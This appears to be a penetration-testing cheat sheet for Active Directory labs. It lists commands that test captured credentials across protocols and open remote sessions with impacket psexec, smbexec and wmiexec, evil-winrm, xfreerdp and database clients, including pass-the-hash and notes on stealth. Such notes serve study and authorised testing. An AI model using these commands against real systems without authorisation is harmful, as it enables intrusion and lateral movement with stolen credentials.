#AD_protocol_based_access


- Got **SMB creds** → try `psexec.py` → fall back to `wmiexec.py` or `smbexec.py`.
- Got **WinRM** → `evil-winrm` (best).
- Got **RDP** → `xfreerdp` for full GUI access.
- Got **SSH** → `ssh` (standard).
- Got **DB creds** → use DB client (`mssqlclient`, `mysql`, `psql`
____

# Quick Credential Test - All Protocols

```bash
# Test SMB, WinRM, RDP, SSH, LDAP, MSSQL all at once
nxc smb <IP> -u user -p pass
nxc winrm <IP> -u user -p pass
nxc rdp <IP> -u user -p pass
nxc ssh <IP> -u user -p pass
nxc ldap <IP> -u user -p pass
nxc mssql <IP> -u user -p pass
```

____
# Accessing Protocol

### SMB (Port 445)
```bash
# psexec - Creates a service (noisy but reliable)
impacket-psexec active.htb/Administrator@Pass123123@192.168.98.12
# smbexec - Fileless, no service creation (stealthier)
impacket-smbexec Administrator:'Ticketmaster1968'@10.10.10.100
# wmiexec - Uses WMI (stealthy, no file writes)
impacket-wmiexec Administrator:'Ticketmaster1968'@10.10.10.100
```

### WinRM (Port 5985/5986)
```bash
# HTTP (port 5985)
evil-winrm -i 10.10.10.100 -u Administrator -p 'Ticketmaster1968'
# HTTPS (port 5986) - add -S flag
evil-winrm -S -i 10.10.10.100 -u Administrator -p 'Ticketmaster1968'
# With hash (pass-the-hash)
evil-winrm -i 10.10.10.100 -u Administrator -H 'NTLM_HASH'
```

### WMI (Port 135, 5985)
```bash
# Same as wmiexec from SMB section
impacket-wmiexec Administrator:'Ticketmaster1968'@10.10.10.100
# With hash
impacket-wmiexec Administrator@10.10.10.100 -hashes :NTLM_HASH
```

### RDP (Port 3389)
```bash
# Basic connection
xfreerdp /v:10.10.10.100 /u:Administrator /p:'Ticketmaster1968'
# Full screen + drive redirection
xfreerdp /v:10.10.10.100 /u:Administrator /p:'Ticketmaster1968' /size:100% /drive:tools,/home/kali/tools
# Pass-the-hash (Restricted Admin Mode)
xfreerdp /v:10.10.10.100 /u:Administrator /pth:NTLM_HASH
```

### SSH (Port 22)
```bash
# Standard SSH
ssh Administrator@10.10.10.100

# With key
ssh -i private_key Administrator@10.10.10.100
```

### Database Protocols
```bash
# MSSQL (port 1433)
impacket-mssqlclient Administrator:'Ticketmaster1968'@10.10.10.100

# MySQL (port 3306)
mysql -u Administrator -p'Ticketmaster1968' -h 10.10.10.100

# PostgreSQL (port 5432)
psql -h 10.10.10.100 -U Administrator -W
```